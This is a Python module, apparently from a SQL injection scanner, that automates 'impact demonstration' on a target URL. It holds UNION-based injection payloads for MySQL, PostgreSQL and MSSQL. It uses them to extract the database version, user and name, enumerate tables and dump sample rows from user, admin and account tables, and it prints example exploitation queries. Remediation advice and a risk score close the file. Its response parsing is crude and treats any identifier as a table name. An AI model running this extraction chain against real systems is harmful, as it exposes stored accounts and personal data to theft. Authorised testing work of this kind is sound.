"""
Impact Demonstration Module for SQL Injection

Automatically demonstrates the real impact of detected SQL injection vulnerabilities:
- Data extraction
- Database schema enumeration
- Privilege information
- Proof-of-concept generation
- Risk scoring
"""

import logging
import re
from typing import Dict, List, Optional, Any
import hashlib

logger = logging.getLogger(__name__)


class ImpactDemonstrator:
    """Demonstrates the real-world impact of SQL injection vulnerabilities"""
    
    def __init__(self, engine):
        """
        Initialize impact demonstrator
        
        Args:
            engine: SQLInjectionEngine instance for making requests
        """
        self.engine = engine
        self.extracted_data = {
            'databases': [],
            'tables': [],
            'columns': [],
            'users': [],
            'sensitive_data': [],
        }
    
    def demonstrate_impact(self,
                          url: str,
                          method: str,
                          vulnerable_param: str,
                          param_type: str,
                          db_type: str,
                          params: Optional[Dict] = None,
                          data: Optional[Dict] = None,
                          cookies: Optional[Dict] = None,
                          headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Demonstrate the full impact of a SQL injection vulnerability
        
        Returns:
            Dict containing impact demonstration results
        """
        impact = {
            'severity': 'low',
            'confidence': 0.0,
            'exploitable': False,
            'data_extracted': False,
            'schema_enumerated': False,
            'sensitive_data_found': False,
            'proof_of_concept': [],
            'extracted_info': {},
            'risk_score': 0,
            'recommendations': [],
        }
        
        logger.info(f"Demonstrating impact for {vulnerable_param} on {url}")
        
        # Step 1: Extract database information
        db_info = self._extract_database_info(
            url, method, vulnerable_param, param_type, db_type,
            params, data, cookies, headers
        )
        
        if db_info:
            impact['exploitable'] = True
            impact['extracted_info'].update(db_info)
            impact['data_extracted'] = True
            impact['confidence'] += 0.3
        
        # Step 2: Enumerate database schema
        schema_info = self._enumerate_schema(
            url, method, vulnerable_param, param_type, db_type,
            params, data, cookies, headers
        )
        
        if schema_info:
            impact['schema_enumerated'] = True
            impact['extracted_info']['schema'] = schema_info
            impact['confidence'] += 0.2
            self.extracted_data['tables'] = schema_info.get('tables', [])
        
        # Step 3: Extract sample data
        sample_data = self._extract_sample_data(
            url, method, vulnerable_param, param_type, db_type,
            params, data, cookies, headers,
            schema_info
        )
        
        if sample_data:
            impact['sensitive_data_found'] = len(sample_data) > 0
            impact['extracted_info']['sample_data'] = sample_data
            impact['confidence'] += 0.2
            self.extracted_data['sensitive_data'] = sample_data
        
        # Step 4: Check for sensitive information
        sensitive_score = self._analyze_sensitive_data(sample_data, schema_info)
        impact['confidence'] += sensitive_score * 0.3
        
        # Step 5: Generate proof-of-concept
        impact['proof_of_concept'] = self._generate_proof_of_concept(
            vulnerable_param, param_type, db_type, impact['extracted_info']
        )
        
        # Step 6: Calculate risk score and severity
        impact['risk_score'] = self._calculate_risk_score(impact)
        impact['severity'] = self._determine_severity(impact['risk_score'])
        
        # Step 7: Generate recommendations
        impact['recommendations'] = self._generate_recommendations(impact)
        
        # Ensure confidence is capped at 1.0
        impact['confidence'] = min(1.0, impact['confidence'])
        
        logger.info(f"Impact demonstration complete: severity={impact['severity']}, risk_score={impact['risk_score']}")
        
        return impact
    
    def _extract_database_info(self, url, method, param, param_type, db_type,
                               params, data, cookies, headers) -> Optional[Dict]:
        """Extract basic database information"""
        info = {}
        
        # Prepare test parameters
        test_params = params.copy() if params else {}
        test_data = data.copy() if data else {}
        
        try:
            # Extract database version
            if db_type == 'mysql':
                version_payload = "' UNION SELECT @@version,NULL,NULL--"
                user_payload = "' UNION SELECT user(),NULL,NULL--"
                db_payload = "' UNION SELECT database(),NULL,NULL--"
            elif db_type == 'postgresql':
                version_payload = "' UNION SELECT version(),NULL,NULL--"
                user_payload = "' UNION SELECT current_user,NULL,NULL--"
                db_payload = "' UNION SELECT current_database(),NULL,NULL--"
            elif db_type == 'mssql':
                version_payload = "' UNION SELECT @@version,NULL,NULL--"
                user_payload = "' UNION SELECT SYSTEM_USER,NULL,NULL--"
                db_payload = "' UNION SELECT DB_NAME(),NULL,NULL--"
            else:
                return None
            
            # Test version extraction
            if param_type == 'GET':
                test_params[param] = version_payload
            else:
                test_data[param] = version_payload
            
            response = self.engine._make_request(url, method, test_params, test_data, cookies, headers)
            if response and response.status_code == 200:
                version = self._extract_from_response(response.text, 'version')
                if version:
                    info['database_version'] = version
                    logger.info(f"Extracted database version: {version[:50]}")
            
            # Test user extraction
            if param_type == 'GET':
                test_params[param] = user_payload
            else:
                test_data[param] = user_payload
            
            response = self.engine._make_request(url, method, test_params, test_data, cookies, headers)
            if response and response.status_code == 200:
                user = self._extract_from_response(response.text, 'user')
                if user:
                    info['database_user'] = user
                    logger.info(f"Extracted database user: {user}")
            
            # Test database name extraction
            if param_type == 'GET':
                test_params[param] = db_payload
            else:
                test_data[param] = db_payload
            
            response = self.engine._make_request(url, method, test_params, test_data, cookies, headers)
            if response and response.status_code == 200:
                db_name = self._extract_from_response(response.text, 'database')
                if db_name:
                    info['current_database'] = db_name
                    logger.info(f"Extracted database name: {db_name}")
            
            return info if info else None
            
        except Exception as e:
            logger.error(f"Error extracting database info: {e}")
            return None
    
    def _enumerate_schema(self, url, method, param, param_type, db_type,
                         params, data, cookies, headers) -> Optional[Dict]:
        """Enumerate database schema (tables)"""
        schema = {'tables': [], 'table_count': 0}
        
        test_params = params.copy() if params else {}
        test_data = data.copy() if data else {}
        
        try:
            # Table enumeration payloads
            if db_type == 'mysql':
                payload = "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 10--"
            elif db_type == 'postgresql':
                payload = "' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public' LIMIT 10--"
            elif db_type == 'mssql':
                payload = "' UNION SELECT TOP 10 name,NULL,NULL FROM sysobjects WHERE xtype='U'--"
            else:
                return None
            
            if param_type == 'GET':
                test_params[param] = payload
            else:
                test_data[param] = payload
            
            response = self.engine._make_request(url, method, test_params, test_data, cookies, headers)
            if response and response.status_code == 200:
                tables = self._extract_table_names(response.text, db_type)
                if tables:
                    schema['tables'] = tables
                    schema['table_count'] = len(tables)
                    logger.info(f"Extracted {len(tables)} table names: {tables[:5]}")
            
            return schema if schema['tables'] else None
            
        except Exception as e:
            logger.error(f"Error enumerating schema: {e}")
            return None
    
    def _extract_sample_data(self, url, method, param, param_type, db_type,
                            params, data, cookies, headers, schema_info) -> List[Dict]:
        """Extract sample data from identified tables"""
        sample_data = []
        
        if not schema_info or not schema_info.get('tables'):
            return sample_data
        
        test_params = params.copy() if params else {}
        test_data = data.copy() if data else {}
        
        # Focus on potentially sensitive tables
        sensitive_table_patterns = ['user', 'account', 'admin', 'customer', 'member', 'auth']
        tables_to_check = []
        
        for table in schema_info['tables'][:5]:  # Limit to 5 tables
            if any(pattern in table.lower() for pattern in sensitive_table_patterns):
                tables_to_check.append(table)
        
        # If no sensitive tables found, use first 2 tables
        if not tables_to_check:
            tables_to_check = schema_info['tables'][:2]
        
        for table in tables_to_check:
            try:
                # Generic data extraction
                if db_type == 'mysql':
                    payload = f"' UNION SELECT * FROM {table} LIMIT 3--"
                elif db_type == 'postgresql':
                    payload = f"' UNION SELECT * FROM {table} LIMIT 3--"
                elif db_type == 'mssql':
                    payload = f"' UNION SELECT TOP 3 * FROM {table}--"
                else:
                    continue
                
                if param_type == 'GET':
                    test_params[param] = payload
                else:
                    test_data[param] = payload
                
                response = self.engine._make_request(url, method, test_params, test_data, cookies, headers)
                if response and response.status_code == 200:
                    data_sample = self._extract_data_from_response(response.text, table)
                    if data_sample:
                        sample_data.append({
                            'table': table,
                            'rows': data_sample,
                            'row_count': len(data_sample)
                        })
                        logger.info(f"Extracted {len(data_sample)} rows from {table}")
            
            except Exception as e:
                logger.error(f"Error extracting data from {table}: {e}")
                continue
        
        return sample_data
    
    def _extract_from_response(self, response_text: str, data_type: str) -> Optional[str]:
        """Extract specific data from response text"""
        # Look for common patterns in responses
        if data_type == 'version':
            # Look for version strings
            patterns = [
                r'(\d+\.\d+\.\d+)',
                r'MySQL\s+([\d\.]+)',
                r'PostgreSQL\s+([\d\.]+)',
                r'Microsoft SQL Server\s+([\d\.]+)',
            ]
            for pattern in patterns:
                match = re.search(pattern, response_text)
                if match:
                    return match.group(1) if match.lastindex == 1 else match.group(0)
        
        elif data_type == 'user':
            # Look for user patterns
            patterns = [
                r'([a-zA-Z0-9_]+@[a-zA-Z0-9_\.-]+)',  # user@host
                r'root|admin|postgres|sa|system',
            ]
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return match.group(0)
        
        elif data_type == 'database':
            # Look for database name patterns
            match = re.search(r'database[:\s]+([a-zA-Z0-9_]+)', response_text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def _extract_table_names(self, response_text: str, db_type: str) -> List[str]:
        """Extract table names from response"""
        tables = []
        
        # Look for SQL identifier patterns
        patterns = [
            r'\b([a-zA-Z_][a-zA-Z0-9_]{2,30})\b',  # Valid SQL identifiers
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            # Filter out common non-table words
            exclude = {'select', 'from', 'where', 'and', 'or', 'null', 'union', 'table', 'column'}
            tables.extend([m for m in matches if m.lower() not in exclude and len(m) > 2])
        
        # Deduplicate and return first 10
        return list(set(tables))[:10]
    
    def _extract_data_from_response(self, response_text: str, table: str) -> List[str]:
        """Extract actual data rows from response"""
        # This is simplified - real extraction would need more sophisticated parsing
        # Look for patterns that might be data
        data_lines = []
        
        # Look for comma-separated values or colon-separated patterns
        patterns = [
            r'([a-zA-Z0-9_\.@\-]+:[a-zA-Z0-9_\.@\-]+)',  # key:value
            r'([a-zA-Z0-9_\.@\-]+,[a-zA-Z0-9_\.@\-]+)',  # csv
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            data_lines.extend(matches[:3])  # Limit to 3 rows
        
        return data_lines
    
    def _analyze_sensitive_data(self, sample_data: List[Dict], schema_info: Optional[Dict]) -> float:
        """Analyze if extracted data contains sensitive information"""
        score = 0.0
        
        # Check for sensitive table names
        if schema_info and schema_info.get('tables'):
            sensitive_tables = ['user', 'password', 'account', 'admin', 'customer', 'payment', 'credit']
            for table in schema_info['tables']:
                if any(s in table.lower() for s in sensitive_tables):
                    score += 0.1
        
        # Check for sensitive data patterns in extracted data
        if sample_data:
            for table_data in sample_data:
                # Check table name
                table_name = table_data.get('table', '').lower()
                if any(s in table_name for s in ['user', 'account', 'admin', 'password']):
                    score += 0.15
                
                # Check data content
                rows = table_data.get('rows', [])
                for row in rows:
                    if isinstance(row, str):
                        # Check for email patterns
                        if re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', row):
                            score += 0.05
                        # Check for hash patterns
                        if re.search(r'\b[a-f0-9]{32,64}\b', row, re.IGNORECASE):
                            score += 0.05
        
        return min(1.0, score)
    
    def _generate_proof_of_concept(self, param: str, param_type: str, 
                                   db_type: str, extracted_info: Dict) -> List[str]:
        """Generate proof-of-concept queries"""
        poc = []
        
        # Basic injection POC
        poc.append(f"Parameter '{param}' ({param_type}) is vulnerable to SQL injection")
        poc.append(f"Database Type: {db_type}")
        
        # Add extracted information
        if extracted_info.get('database_version'):
            poc.append(f"Database Version: {extracted_info['database_version'][:50]}")
        
        if extracted_info.get('database_user'):
            poc.append(f"Database User: {extracted_info['database_user']}")
        
        if extracted_info.get('current_database'):
            poc.append(f"Current Database: {extracted_info['current_database']}")
        
        # Add schema information
        if extracted_info.get('schema', {}).get('tables'):
            tables = extracted_info['schema']['tables'][:5]
            poc.append(f"Discovered Tables: {', '.join(tables)}")
        
        # Add sample data info
        if extracted_info.get('sample_data'):
            data_count = len(extracted_info['sample_data'])
            poc.append(f"Extracted data from {data_count} table(s)")
        
        # Example exploitation queries
        poc.append("\nExample Exploitation Queries:")
        if db_type == 'mysql':
            poc.append(f"  {param}=' UNION SELECT database(),user(),version()--")
            poc.append(f"  {param}=' UNION SELECT table_name FROM information_schema.tables--")
        elif db_type == 'postgresql':
            poc.append(f"  {param}=' UNION SELECT current_database(),current_user,version()--")
        
        return poc
    
    def _calculate_risk_score(self, impact: Dict) -> int:
        """Calculate risk score from 0-100"""
        score = 0
        
        # Base score for exploitability
        if impact['exploitable']:
            score += 30
        
        # Data extraction bonus
        if impact['data_extracted']:
            score += 20
        
        # Schema enumeration bonus
        if impact['schema_enumerated']:
            score += 15
        
        # Sensitive data bonus
        if impact['sensitive_data_found']:
            score += 25
        
        # Confidence multiplier
        score = int(score * impact['confidence'])
        
        return min(100, score)
    
    def _determine_severity(self, risk_score: int) -> str:
        """Determine severity level based on risk score"""
        if risk_score >= 75:
            return 'critical'
        elif risk_score >= 50:
            return 'high'
        elif risk_score >= 25:
            return 'medium'
        else:
            return 'low'
    
    def _generate_recommendations(self, impact: Dict) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        recommendations.append("IMMEDIATE ACTIONS REQUIRED:")
        recommendations.append("1. Use parameterized queries (prepared statements) for all database interactions")
        recommendations.append("2. Implement input validation and sanitization")
        recommendations.append("3. Apply principle of least privilege to database accounts")
        recommendations.append("4. Enable SQL injection detection in WAF")
        
        if impact['severity'] in ['critical', 'high']:
            recommendations.append("5. URGENT: Patch this vulnerability immediately - data breach imminent")
            recommendations.append("6. Audit database for unauthorized access")
            recommendations.append("7. Consider implementing database activity monitoring")
        
        if impact['sensitive_data_found']:
            recommendations.append("8. Review data encryption policies")
            recommendations.append("9. Implement additional authentication for sensitive operations")
        
        return recommendations
